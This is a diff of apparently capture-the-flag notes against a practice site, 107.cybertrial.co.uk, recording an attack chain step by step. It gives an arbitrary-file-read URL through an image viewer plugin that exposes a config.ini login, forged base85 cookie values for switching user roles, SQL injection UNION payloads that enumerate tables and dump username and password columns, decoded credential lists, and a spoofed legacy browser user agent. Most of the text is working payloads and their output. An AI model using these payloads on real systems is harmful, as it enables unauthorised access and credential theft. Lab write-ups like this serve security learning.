@@ -1,33 +1,48 @@
+# One of the additions was a viewer plugin for images that allowed for
+# arbitary file read of a few formats including txt
 http://107.cybertrial.co.uk/plugins/viewer/view?book=photos/
 
-
-bottom of file http://107.cybertrial.co.uk/plugins/viewer/view?book=plugins/wc-auth/config.ini
+# We found a config.ini and at the bottom of there we got a login
+# using that login got us the first flag
+url: http://107.cybertrial.co.uk/plugins/viewer/view?book=plugins/wc-auth/config.ini
 wc-libsec-support
 imtrappedinthelibraryhelpme!2000
 
 
-base85 
-guest01
-B6%40d%2CF%3E%2CE
+# After getting that first flag we started looking at the cookie
+# after ages looking at it we worked out it was base85 encoding
+guest01 = B6%40d%2CF%3E%2CE
+borrower201wc = %40W%2D%3A%2DDg%2Cc51%2C%28G%2C%40f
+staff301wc = F%2A%28i%26Ahu%2BqG%40L
 
-borrower201wc
-%40W%2D%3A%2DDg%2Cc51%2C%28G%2C%40f
-
-staff301wc
-F%2A%28i%26Ahu%2BqG%40L
-
-
+# After changing the cookie to login as borrower201wc
+# we dumped the databases we could access and found wc_borrowers1
 ' UNION SELECT table_schema,table_name,column_name,NULL,NULL FROM information_schema.columns WHERE table_schema != 'information_schema' -- 
-wc_borrowers1
 
+# We dumped the creds from that database and then base85 decoded
+# passwords and got the second flag
 ' UNION SELECT username,password,NULL,NULL,NULL FROM wc_borrowers1-- 
 
-# base85 decode passwords
-
-harry.smyth		CM%-;1LauQ2eH]D2_t
+harry.smyth		CM%-;1LauQ2eH]D2_t	kfe83bg37fgs73
 jake.peters		GUhLB4>U02/7"b2J-C
-ruth.barnet		G%YJI1i@AHBkVE@3G2q
-jane.richards		E+WiD2)oJpAi;GS@po
+ruth.barnet		G%YJI1i@AHBkVE@3G2q	vgh74nsfiho39gf
+jane.richards		E+WiD2)oJpAi;GS@po	pfj758nsf63bca
 terry.edwards		ChIg&DDs@G%rflAnV
-richard.bakewell	B5MEuE]GpbG%P3)@K
-barry.blacksmith	F(T/C3&>#V@WQ'=1M-
+richard.bakewell	B5MEuE]GpbG%P3)@K	gmkir93bvfbsb
+barry.blacksmith	F(T/C3&>#V@WQ'=1M-	sfj383bgbsd73f
+
+
+# After changing the cookie again to access it as staff301wc we got
+# a message saying browser not recognised, we worked out the browser
+# needed was Internet Explorer for Windows 98
+Mozilla/4.0 (compatible; MSIE 5.0; AOL 6.0; Windows 98; DigExt; YComp 5.0.2.5)
+
+# After getting this login we dumped the database tables again
+# we found the wc_staff1 and dumped the contents of that again
+' UNION SELECT table_schema,table_name,column_name,NULL,NULL FROM information_schema.columns WHERE table_schema != 'information_schema' -- 
+' UNION SELECT username,password,NULL,NULL,NULL FROM wc_staff1-- 
+
+# After dumping the table we got the below creds, and base85
+# decoded the passwords
+sally.jane		3G*"^2DR7(BOYF,2Z	9fj3628fhbb37
+peter.hoffman		C1q4#Gr%E;2_m(.		jhfsy385720s
